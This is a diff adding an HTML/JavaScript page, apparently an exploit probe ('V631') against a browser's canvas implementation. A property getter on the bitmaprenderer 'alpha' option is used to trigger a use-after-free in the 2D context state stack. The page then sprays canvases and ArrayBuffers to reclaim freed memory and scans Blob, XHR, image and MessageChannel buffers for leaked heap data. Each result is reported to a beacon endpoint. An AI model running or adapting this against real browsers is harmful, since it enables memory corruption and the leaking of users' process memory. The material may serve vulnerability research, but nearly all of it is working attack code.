@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V631</title></head>
+<body><pre id="out">V631</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<120;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%120];
+  img.src='/beacon/V631-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+function f2h(v){_f64[0]=v;return ('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+bk('BOOT','v631-realloc-ab-dontinitialize');
+
+var SPRAY_N=500,MARKER=77777.5;
+
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+var innerCtx=null,getterRan=false;
+var uafOpts={};
+Object.defineProperty(uafOpts,'alpha',{get:function(){
+  getterRan=true;
+  innerCtx=canvas.getContext('2d');
+  for(var s=0;s<8;s++) innerCtx.save();
+  innerCtx.lineWidth=3.14159;
+  innerCtx.setLineDash([1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8]);
+  return true;
+}});
+var bmrCtx=canvas.getContext('bitmaprenderer',uafOpts);
+bk('S1','bmr='+(bmrCtx?'OK':'X')+',i='+(innerCtx?'OK':'X'));
+
+var sprayCtxs=[];
+for(var sp=0;sp<SPRAY_N;sp++){
+  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+  sprayCtxs.push({c:sc,ctx:sc.getContext('2d')});
+}
+try{innerCtx.lineWidth=MARKER;}catch(e){}
+var aliasIdx=-1;
+for(var a=0;a<sprayCtxs.length;a++){
+  if(sprayCtxs[a].ctx.lineWidth===MARKER){aliasIdx=a;break;}
+}
+bk('S2','alias='+aliasIdx);
+if(aliasIdx<0){bk('DEAD','no-alias');throw 0;}
+var alias=sprayCtxs[aliasIdx].ctx;
+
+/* PHASE A: Grow stateStack out-of-line, set markers */
+for(var sv=0;sv<15;sv++) innerCtx.save();
+innerCtx.lineWidth=11111.11;
+var bigDash=[];for(var bd=0;bd<500;bd++) bigDash.push(0xBEEF0000+bd);
+innerCtx.setLineDash(bigDash);
+bk('A1','saves=15,lw='+alias.lineWidth+',dash='+alias.getLineDash().length);
+
+/* PHASE B: Force realloc — save() past cap 16 */
+innerCtx.save();
+innerCtx.lineWidth=22222.22;
+bk('B1','realloc-trigger,lw='+alias.lineWidth);
+
+/* Old buffer A (6400B class) freed, contains stale States with lineDash pointers.
+ * New buffer B holds copies. */
+
+/* PHASE C: AB spray to reclaim A */
+var abSize=6656;
+var abs=[];
+for(var ai=0;ai<200;ai++) abs.push(new ArrayBuffer(abSize));
+bk('C1','spray=200,sz='+abSize);
+
+/* PHASE D: Scan ABs for stale data (expecting zeros from zero-init) */
+var nzCount=0,nzFirst='';
+for(var si=0;si<abs.length;si++){
+  var fv=new Float64Array(abs[si]);
+  for(var sj=0;sj<fv.length;sj++){
+    if(fv[sj]!==0){
+      nzCount++;
+      if(nzCount===1) nzFirst='ab'+si+':'+sj*8+'='+f2h(fv[sj]);
+      if(nzCount<=3) bk('NZ','ab='+si+',off='+sj*8+',v='+f2h(fv[sj]));
+      break;
+    }
+  }
+}
+bk('D1','nz='+nzCount+','+nzFirst);
+
+/* PHASE E: Gradient fillStyle through alias */
+try{
+  var grad=innerCtx.createLinearGradient(0,0,100,100);
+  grad.addColorStop(0,'red');grad.addColorStop(1,'blue');
+  innerCtx.fillStyle=grad;
+  var fs1=alias.fillStyle;
+  bk('E1','type='+typeof fs1+',str='+String(fs1).slice(0,60));
+  innerCtx.fillStyle='#abcdef';
+}catch(e){bk('E-ERR',e.name);}
+
+/* PHASE F: Integer enum probes */
+try{
+  bk('F1','ta='+innerCtx.textAlign+',tb='+innerCtx.textBaseline+',dir='+innerCtx.direction+',isq='+innerCtx.imageSmoothingQuality);
+}catch(e){bk('F-ERR',e.name);}
+
+/* PHASE G: Poison heap, then Blob→AB DontInitialize test */
+try{
+  innerCtx.restore();
+  var poison=[];for(var pp=0;pp<500;pp++) poison.push(0xDEAD0000+pp);
+  innerCtx.setLineDash(poison);
+  innerCtx.setLineDash([]);
+
+  var blobBytes=new Uint8Array(4000);
+  var blob=new Blob([blobBytes]);
+  var reader=new FileReader();
+  reader.onload=function(){
+    var r=reader.result;
+    if(!r||!r.byteLength){bk('G1','empty');return;}
+    var dv=new DataView(r);
+    var hits=0,vals=[];
+    for(var ri=0;ri<r.byteLength;ri+=8){
+      var val=dv.getFloat64(ri,true);
+      if(val!==0){hits++;vals.push(ri+'='+f2h(val));if(hits>=4)break;}
+    }
+    bk('G1','blob-nz='+hits+(vals.length?','+vals[0]:''));
+    if(vals.length>1) bk('G2',vals.slice(1).join(','));
+  };
+  reader.readAsArrayBuffer(blob);
+}catch(e){bk('G-ERR',e.name);}
+
+/* PHASE H: getImageData on never-drawn canvas */
+try{
+  var px=document.createElement('canvas');px.width=64;px.height=64;
+  var pxCtx=px.getContext('2d');
+  var id=pxCtx.getImageData(0,0,64,64);
+  var nzPx=0;
+  for(var pi=0;pi<id.data.length;pi++){if(id.data[pi]!==0){nzPx++;if(nzPx>5)break;}}
+  bk('H1','pixel-nz='+nzPx);
+
+  var id2=pxCtx.createImageData(64,64);
+  var nz2=0;
+  for(var qi=0;qi<id2.data.length;qi++){if(id2.data[qi]!==0){nz2++;if(nz2>5)break;}}
+  bk('H2','create-nz='+nz2);
+}catch(e){bk('H-ERR',e.name);}
+
+/* PHASE I: XHR arraybuffer DontInitialize test */
+try{
+  var xhr=new XMLHttpRequest();
+  xhr.responseType='arraybuffer';
+  xhr.open('GET','/beacon/V631-XHR?d=xhrtest&t='+Date.now(),true);
+  xhr.onload=function(){
+    if(!xhr.response){bk('I1','null');return;}
+    var dv=new DataView(xhr.response);
+    var hits=0,vals=[];
+    for(var xi=0;xi<xhr.response.byteLength;xi+=8){
+      var v=dv.getFloat64(xi,true);
+      if(v!==0){hits++;vals.push(xi+'='+f2h(v));if(hits>=3)break;}
+    }
+    bk('I1','xhr-nz='+hits+',sz='+xhr.response.byteLength+(vals.length?','+vals[0]:''));
+  };
+  xhr.send();
+}catch(e){bk('I-ERR',e.name);}
+
+/* PHASE J: MessageChannel transfer leak test */
+try{
+  var mc=new MessageChannel();
+  var testAB=new ArrayBuffer(64);
+  var testView=new Float64Array(testAB);
+  for(var ti=0;ti<8;ti++) testView[ti]=0xCAFE0000+ti;
+  mc.port1.onmessage=function(ev){
+    var buf=ev.data;
+    if(buf instanceof ArrayBuffer){
+      var dv=new DataView(buf);
+      var hits=0,vals=[];
+      for(var ji=0;ji<buf.byteLength;ji+=8){
+        var v=dv.getFloat64(ji,true);
+        vals.push(f2h(v));
+      }
+      bk('J1','mc-sz='+buf.byteLength+',v0='+vals[0]+',v7='+(vals[7]||'?'));
+    }else{
+      bk('J1','mc-type='+typeof buf);
+    }
+  };
+  mc.port2.postMessage(testAB,[testAB]);
+}catch(e){bk('J-ERR',e.name);}
+
+canvas._a=abs;canvas._s=sprayCtxs;
+setTimeout(function(){bk('DONE','alias='+aliasIdx+',nz='+nzCount);say('DONE');},10000);
+</script>
+</body></html>
